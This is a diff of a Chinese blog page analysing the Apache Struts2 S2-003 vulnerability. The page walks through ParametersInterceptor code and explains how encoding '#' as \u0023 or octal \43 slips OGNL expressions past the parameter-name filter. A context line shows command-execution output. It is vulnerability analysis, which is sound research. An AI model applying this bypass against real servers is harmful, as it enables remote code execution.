-                    <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">parameterNameAware</span> <span class="o">==</span> <span class="kc">null</span>
-                    <span class="o">||</span> <span class="n">parameterNameAware</span><span class="o">.</span><span class="na">acceptableParameterName</span><span class="o">(</span><span class="n">name</span><span class="o">));</span>
-
-            <span class="k">if</span> <span class="o">(</span><span class="n">acceptableName</span><span class="o">)</span> <span class="o">{</span>
-                <span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">();</span>
-                <span class="k">try</span> <span class="o">{</span>
-
-                	<span class="c1">// 此时的name为我们的OGNL表达式，从而触发了OGNL表达式
-</span><span class="c1"></span>                    <span class="n">stack</span><span class="o">.</span><span class="na">setValue</span><span class="o">(</span><span class="n">name</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
-                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">RuntimeException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
-                    <span class="k">if</span> <span class="o">(</span><span class="n">devMode</span><span class="o">)</span> <span class="o">{</span>
-                        <span class="n">String</span> <span class="n">developerNotification</span> <span class="o">=</span> <span class="n">LocalizedTextUtil</span><span class="o">.</span><span class="na">findText</span><span class="o">(</span><span class="n">ParametersInterceptor</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="s">&#34;devmode.notification&#34;</span><span class="o">,</span> <span class="n">ActionContext</span><span class="o">.</span><span class="na">getContext</span><span class="o">().</span><span class="na">getLocale</span><span class="o">(),</span> <span class="s">&#34;Developer Notification:\n{0}&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span>
-                                <span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">()</span>
-                        <span class="o">});</span>
-                        <span class="n">LOG</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="n">developerNotification</span><span class="o">);</span>
-                        <span class="k">if</span> <span class="o">(</span><span class="n">action</span> <span class="k">instanceof</span> <span class="n">ValidationAware</span><span class="o">)</span> <span class="o">{</span>
-                            <span class="o">((</span><span class="n">ValidationAware</span><span class="o">)</span> <span class="n">action</span><span class="o">).</span><span class="na">addActionMessage</span><span class="o">(</span><span class="n">developerNotification</span><span class="o">);</span>
-                        <span class="o">}</span>
-                    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
-                        <span class="n">LOG</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">&#34;ParametersInterceptor - [setParameters]: Unexpected Exception caught setting &#39;&#34;</span> <span class="o">+</span> <span class="n">name</span> <span class="o">+</span> <span class="s">&#34;&#39; on &#39;&#34;</span> <span class="o">+</span> <span class="n">action</span><span class="o">.</span><span class="na">getClass</span><span class="o">()</span> <span class="o">+</span> <span class="s">&#34;: &#34;</span> <span class="o">+</span> <span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
-                    <span class="o">}</span>
-                <span class="o">}</span>
-            <span class="o">}</span>
-        <span class="o">}</span>
-    <span class="o">}</span>
-
-    <span class="cm">/**
-</span><span class="cm">     * Gets an instance of the comparator to use for the ordered sorting.  Override this
-</span><span class="cm">     * method to customize the ordering of the parameters as they are set to the
-</span><span class="cm">     * action.
-</span><span class="cm">     *
-</span><span class="cm">     * @return A comparator to sort the parameters
-</span><span class="cm">     */</span>
-    <span class="kd">protected</span> <span class="n">Comparator</span> <span class="nf">getOrderedComparator</span><span class="o">()</span> <span class="o">{</span>
-        <span class="k">return</span> <span class="n">rbCollator</span><span class="o">;</span>
-    <span class="o">}</span>
-
-    <span class="kd">private</span> <span class="n">String</span> <span class="nf">getParameterLogMap</span><span class="o">(</span><span class="n">Map</span> <span class="n">parameters</span><span class="o">)</span> <span class="o">{</span>
-        <span class="k">if</span> <span class="o">(</span><span class="n">parameters</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
-            <span class="k">return</span> <span class="s">&#34;NONE&#34;</span><span class="o">;</span>
-        <span class="o">}</span>
-
-        <span class="n">StringBuffer</span> <span class="n">logEntry</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuffer</span><span class="o">();</span>
-        <span class="k">for</span> <span class="o">(</span><span class="n">Iterator</span> <span class="n">paramIter</span> <span class="o">=</span> <span class="n">parameters</span><span class="o">.</span><span class="na">entrySet</span><span class="o">().</span><span class="na">iterator</span><span class="o">();</span> <span class="n">paramIter</span><span class="o">.</span><span class="na">hasNext</span><span class="o">();)</span> <span class="o">{</span>
-            <span class="n">Map</span><span class="o">.</span><span class="na">Entry</span> <span class="n">entry</span> <span class="o">=</span> <span class="o">(</span><span class="n">Map</span><span class="o">.</span><span class="na">Entry</span><span class="o">)</span> <span class="n">paramIter</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
-            <span class="n">logEntry</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">entry</span><span class="o">.</span><span class="na">getKey</span><span class="o">()));</span>
-            <span class="n">logEntry</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">&#34; =&gt; &#34;</span><span class="o">);</span>
-            <span class="k">if</span> <span class="o">(</span><span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">()</span> <span class="k">instanceof</span> <span class="n">Object</span><span class="o">[])</span> <span class="o">{</span>
-                <span class="n">Object</span><span class="o">[]</span> <span class="n">valueArray</span> <span class="o">=</span> <span class="o">(</span><span class="n">Object</span><span class="o">[])</span> <span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">();</span>
-                <span class="n">logEntry</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;[ &#34;</span><span class="o">);</span>
-                <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">indexA</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">indexA</span> <span class="o">&lt;</span> <span class="o">(</span><span class="n">valueArray</span><span class="o">.</span><span class="na">length</span> <span class="o">-</span> <span class="n">1</span><span class="o">);</span> <span class="n">indexA</span><span class="o">++)</span> <span class="o">{</span>
-                    <span class="n">Object</span> <span class="n">valueAtIndex</span> <span class="o">=</span> <span class="n">valueArray</span><span class="o">[</span><span class="n">indexA</span><span class="o">];</span>
-                    <span class="n">logEntry</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">valueAtIndex</span><span class="o">);</span>
-                    <span class="n">logEntry</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">valueAtIndex</span><span class="o">));</span>
-                    <span class="n">logEntry</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;, &#34;</span><span class="o">);</span>
-                <span class="o">}</span>
-                <span class="n">logEntry</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">valueArray</span><span class="o">[</span><span class="n">valueArray</span><span class="o">.</span><span class="na">length</span> <span class="o">-</span> <span class="n">1</span><span class="o">]));</span>
-                <span class="n">logEntry</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">&#34; ] &#34;</span><span class="o">);</span>
-            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
-                <span class="n">logEntry</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">()));</span>
-            <span class="o">}</span>
-        <span class="o">}</span>
-
-        <span class="k">return</span> <span class="n">logEntry</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
-    <span class="o">}</span>
+        for (Iterator iterator = params.entrySet().iterator(); iterator.hasNext();) {
+            Map.Entry entry = (Map.Entry) iterator.next();
+            String name = entry.getKey().toString();
 
 
-    <span class="kd">protected</span> <span class="kt">boolean</span> <span class="nf">acceptableName</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
-        <span class="k">if</span> <span class="o">(</span><span class="n">isAccepted</span><span class="o">(</span><span class="n">name</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">isExcluded</span><span class="o">(</span><span class="n">name</span><span class="o">))</span> <span class="o">{</span>
-            <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
-        <span class="o">}</span>
-        <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
-    <span class="o">}</span>
+            // 这里对参数名进行了特殊字符判断，其中包括#字符
+            // 由于我们用\u0023替代#绕过正则判断
+            boolean acceptableName = acceptableName(name)
+                    &amp;&amp; (parameterNameAware == null
+                    || parameterNameAware.acceptableParameterName(name));
 
-    <span class="kd">protected</span> <span class="kt">boolean</span> <span class="nf">isAccepted</span><span class="o">(</span><span class="n">String</span> <span class="n">paramName</span><span class="o">)</span> <span class="o">{</span>
-        <span class="k">if</span> <span class="o">(!</span><span class="k">this</span><span class="o">.</span><span class="na">acceptedParams</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">())</span> <span class="o">{</span>
-            <span class="k">for</span> <span class="o">(</span><span class="n">Pattern</span> <span class="n">pattern</span> <span class="o">:</span> <span class="n">acceptedParams</span><span class="o">)</span> <span class="o">{</span>
-                <span class="n">Matcher</span> <span class="n">matcher</span> <span class="o">=</span> <span class="n">pattern</span><span class="o">.</span><span class="na">matcher</span><span class="o">(</span><span class="n">paramName</span><span class="o">);</span>
-                <span class="k">if</span> <span class="o">(!</span><span class="n">matcher</span><span class="o">.</span><span class="na">matches</span><span class="o">())</span> <span class="o">{</span>
-                    <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
-                <span class="o">}</span>
-            <span class="o">}</span>
-        <span class="o">}</span>
+            if (acceptableName) {
+                Object value = entry.getValue();
+                try {
 
-        <span class="c1">// 这里进行了正则匹配
-</span><span class="c1"></span>        <span class="k">return</span> <span class="n">acceptedPattern</span><span class="o">.</span><span class="na">matcher</span><span class="o">(</span><span class="n">paramName</span><span class="o">).</span><span class="na">matches</span><span class="o">();</span>
-    <span class="o">}</span>
+                    // 此时的name为我们的OGNL表达式，从而触发了OGNL表达式
+                    stack.setValue(name, value);
+                } catch (RuntimeException e) {
+                    if (devMode) {
+                        String developerNotification = LocalizedTextUtil.findText(ParametersInterceptor.class, &quot;devmode.notification&quot;, ActionContext.getContext().getLocale(), &quot;Developer Notification:\n{0}&quot;, new Object[]{
+                                e.getMessage()
+                        });
+                        LOG.error(developerNotification);
+                        if (action instanceof ValidationAware) {
+                            ((ValidationAware) action).addActionMessage(developerNotification);
+                        }
+                    } else {
+                        LOG.error(&quot;ParametersInterceptor - [setParameters]: Unexpected Exception caught setting '&quot; + name + &quot;' on '&quot; + action.getClass() + &quot;: &quot; + e.getMessage());
+                    }
+                }
+            }
+        }
+    }
 
-    <span class="kd">protected</span> <span class="kt">boolean</span> <span class="nf">isExcluded</span><span class="o">(</span><span class="n">String</span> <span class="n">paramName</span><span class="o">)</span> <span class="o">{</span>
-        <span class="k">if</span> <span class="o">(!</span><span class="k">this</span><span class="o">.</span><span class="na">excludeParams</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">())</span> <span class="o">{</span>
-            <span class="k">for</span> <span class="o">(</span><span class="n">Pattern</span> <span class="n">pattern</span> <span class="o">:</span> <span class="n">excludeParams</span><span class="o">)</span> <span class="o">{</span>
-                <span class="n">Matcher</span> <span class="n">matcher</span> <span class="o">=</span> <span class="n">pattern</span><span class="o">.</span><span class="na">matcher</span><span class="o">(</span><span class="n">paramName</span><span class="o">);</span>
-                <span class="k">if</span> <span class="o">(</span><span class="n">matcher</span><span class="o">.</span><span class="na">matches</span><span class="o">())</span> <span class="o">{</span>
-                    <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
-                <span class="o">}</span>
-            <span class="o">}</span>
-        <span class="o">}</span>
-        <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
-    <span class="o">}</span>
+    /**
+     * Gets an instance of the comparator to use for the ordered sorting.  Override this
+     * method to customize the ordering of the parameters as they are set to the
+     * action.
+     *
+     * @return A comparator to sort the parameters
+     */
+    protected Comparator getOrderedComparator() {
+        return rbCollator;
+    }
 
-    <span class="cm">/**
-</span><span class="cm">     * Whether to order the parameters or not
-</span><span class="cm">     *
-</span><span class="cm">     * @return True to order
-</span><span class="cm">     */</span>
-    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">isOrdered</span><span class="o">()</span> <span class="o">{</span>
-        <span class="k">return</span> <span class="n">ordered</span><span class="o">;</span>
-    <span class="o">}</span>
+    private String getParameterLogMap(Map parameters) {
+        if (parameters == null) {
+            return &quot;NONE&quot;;
+        }
 
-    <span class="cm">/**
-</span><span class="cm">     * Set whether to order the parameters by object depth or not
-</span><span class="cm">     *
-</span><span class="cm">     * @param ordered True to order them
-</span><span class="cm">     */</span>
-    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setOrdered</span><span class="o">(</span><span class="kt">boolean</span> <span class="n">ordered</span><span class="o">)</span> <span class="o">{</span>
-        <span class="k">this</span><span class="o">.</span><span class="na">ordered</span> <span class="o">=</span> <span class="n">ordered</span><span class="o">;</span>
-    <span class="o">}</span>
+        StringBuffer logEntry = new StringBuffer();
+        for (Iterator paramIter = parameters.entrySet().iterator(); paramIter.hasNext();) {
+            Map.Entry entry = (Map.Entry) paramIter.next();
+            logEntry.append(String.valueOf(entry.getKey()));
+            logEntry.append(&quot; =&gt; &quot;);
+            if (entry.getValue() instanceof Object[]) {
+                Object[] valueArray = (Object[]) entry.getValue();
+                logEntry.append(&quot;[ &quot;);
+                for (int indexA = 0; indexA &lt; (valueArray.length - 1); indexA++) {
+                    Object valueAtIndex = valueArray[indexA];
+                    logEntry.append(valueAtIndex);
+                    logEntry.append(String.valueOf(valueAtIndex));
+                    logEntry.append(&quot;, &quot;);
+                }
+                logEntry.append(String.valueOf(valueArray[valueArray.length - 1]));
+                logEntry.append(&quot; ] &quot;);
+            } else {
+                logEntry.append(String.valueOf(entry.getValue()));
+            }
+        }
 
-    <span class="cm">/**
-</span><span class="cm">     * Gets a set of regular expressions of parameters to remove
-</span><span class="cm">     * from the parameter map
-</span><span class="cm">     *
-</span><span class="cm">     * @return A set of compiled regular expression patterns
-</span><span class="cm">     */</span>
-    <span class="kd">protected</span> <span class="n">Set</span> <span class="nf">getExcludeParamsSet</span><span class="o">()</span> <span class="o">{</span>
-        <span class="k">return</span> <span class="n">excludeParams</span><span class="o">;</span>
-    <span class="o">}</span>
+        return logEntry.toString();
+    }
 
-    <span class="cm">/**
-</span><span class="cm">     * Sets a comma-delimited list of regular expressions to match
-</span><span class="cm">     * parameters that should be removed from the parameter map.
-</span><span class="cm">     *
-</span><span class="cm">     * @param commaDelim A comma-delimited list of regular expressions
-</span><span class="cm">     */</span>
-    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setExcludeParams</span><span class="o">(</span><span class="n">String</span> <span class="n">commaDelim</span><span class="o">)</span> <span class="o">{</span>
-        <span class="n">Collection</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">excludePatterns</span> <span class="o">=</span> <span class="n">asCollection</span><span class="o">(</span><span class="n">commaDelim</span><span class="o">);</span>
-        <span class="k">if</span> <span class="o">(</span><span class="n">excludePatterns</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
-            <span class="n">excludeParams</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashSet</span><span class="o">&lt;</span><span class="n">Pattern</span><span class="o">&gt;();</span>
-            <span class="k">for</span> <span class="o">(</span><span class="n">String</span> <span class="n">pattern</span> <span class="o">:</span> <span class="n">excludePatterns</span><span class="o">)</span> <span class="o">{</span>
-                <span class="n">excludeParams</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">Pattern</span><span class="o">.</span><span class="na">compile</span><span class="o">(</span><span class="n">pattern</span><span class="o">));</span>
-            <span class="o">}</span>
-        <span class="o">}</span>
-    <span class="o">}</span>
 
-    <span class="cm">/**
-</span><span class="cm">     * Return a collection from the comma delimited String.
-</span><span class="cm">     *
-</span><span class="cm">     * @param commaDelim
-</span><span class="cm">     * @return A collection from the comma delimited String.
-</span><span class="cm">     */</span>
-    <span class="kd">private</span> <span class="n">Collection</span> <span class="nf">asCollection</span><span class="o">(</span><span class="n">String</span> <span class="n">commaDelim</span><span class="o">)</span> <span class="o">{</span>
-        <span class="k">if</span> <span class="o">(</span><span class="n">commaDelim</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="n">commaDelim</span><span class="o">.</span><span class="na">trim</span><span class="o">().</span><span class="na">length</span><span class="o">()</span> <span class="o">==</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
-            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
-        <span class="o">}</span>
-        <span class="k">return</span> <span class="n">TextParseUtil</span><span class="o">.</span><span class="na">commaDelimitedStringToSet</span><span class="o">(</span><span class="n">commaDelim</span><span class="o">);</span>
-    <span class="o">}</span>
-<span class="o">}</span></code></pre></td></tr></table>
-</div>
-</div>
-<p>分析完，原理就是对参数名特殊字符过滤不完善，通过<code>\u0023</code>(16进制的<code>#</code>)绕过正则表达式，从而执行了OGNL表达式.</p>
+    protected boolean acceptableName(String name) {
+        if (isAccepted(name) &amp;&amp; !isExcluded(name)) {
+            return true;
+        }
+        return false;
+    }
+
+    protected boolean isAccepted(String paramName) {
+        if (!this.acceptedParams.isEmpty()) {
+            for (Pattern pattern : acceptedParams) {
+                Matcher matcher = pattern.matcher(paramName);
+                if (!matcher.matches()) {
+                    return false;
+                }
+            }
+        }
+
+        // 这里进行了正则匹配
+        return acceptedPattern.matcher(paramName).matches();
+    }
+
+    protected boolean isExcluded(String paramName) {
+        if (!this.excludeParams.isEmpty()) {
+            for (Pattern pattern : excludeParams) {
+                Matcher matcher = pattern.matcher(paramName);
+                if (matcher.matches()) {
+                    return true;
+                }
+            }
+        }
+        return false;
+    }
+
+    /**
+     * Whether to order the parameters or not
+     *
+     * @return True to order
+     */
+    public boolean isOrdered() {
+        return ordered;
+    }
+
+    /**
+     * Set whether to order the parameters by object depth or not
+     *
+     * @param ordered True to order them
+     */
+    public void setOrdered(boolean ordered) {
+        this.ordered = ordered;
+    }
+
+    /**
+     * Gets a set of regular expressions of parameters to remove
+     * from the parameter map
+     *
+     * @return A set of compiled regular expression patterns
+     */
+    protected Set getExcludeParamsSet() {
+        return excludeParams;
+    }
+
+    /**
+     * Sets a comma-delimited list of regular expressions to match
+     * parameters that should be removed from the parameter map.
+     *
+     * @param commaDelim A comma-delimited list of regular expressions
+     */
+    public void setExcludeParams(String commaDelim) {
+        Collection&lt;String&gt; excludePatterns = asCollection(commaDelim);
+        if (excludePatterns != null) {
+            excludeParams = new HashSet&lt;Pattern&gt;();
+            for (String pattern : excludePatterns) {
+                excludeParams.add(Pattern.compile(pattern));
+            }
+        }
+    }
+
+    /**
+     * Return a collection from the comma delimited String.
+     *
+     * @param commaDelim
+     * @return A collection from the comma delimited String.
+     */
+    private Collection asCollection(String commaDelim) {
+        if (commaDelim == null || commaDelim.trim().length() == 0) {
+            return null;
+        }
+        return TextParseUtil.commaDelimitedStringToSet(commaDelim);
+    }
+}
+
+</code></pre>
+
+<p>分析完，原理就是对参数名特殊字符过滤不完善，通过\u0023(16进制的#)绕过正则表达式，从而执行了OGNL表达式.</p>
 
 <blockquote>
 <p>TIPS: 用八进制的\43也可以绕过.</p>
@@ -688,7 +414,7 @@ uid=1234556(xxxx) gid=1603212982 groups=1603212982....</code></pre></td></tr></t
 
 <p>但实践证明并没有卵用， 由于是老版本的漏洞分析，我也懒得diff代码了。</p>
 
-<h3 id="0x06-引用">0x06 引用</h3>
+<h3 id="0x04-引用">0x04 引用</h3>
 
 <ol>
 <li><a href="https://cwiki.apache.org/confluence/display/WW/S2-003">S2-003安全公告</a></li>
@@ -702,10 +428,10 @@ uid=1234556(xxxx) gid=1603212982 groups=1603212982....</code></pre></td></tr></t
 
     <ul class="pager article-pager">
       <li class="pager-newer">
-          <a href="/posts/s2-bypass-sandbox/" data-toggle="tooltip" data-placement="top" title="Struts2 OGNL沙箱历史绕过方式总结">&lt; Newer</a>
+          <a href="/posts/struts-bypass-sandbox/" data-toggle="tooltip" data-placement="top" title="Struts2 OGNL沙箱历史绕过方式总结">&lt; Newer</a>
       </li>
       <li class="pager-older">
-        <a href="/posts/jenkins-security/" data-toggle="tooltip" data-placement="top" title="Jenkins 安全研究">Older &gt;</a>
+        <a href="/posts/s2-002/" data-toggle="tooltip" data-placement="top" title="Struts2框架: S2-002 漏洞详细分析">Older &gt;</a>
       </li>
     </ul>
 
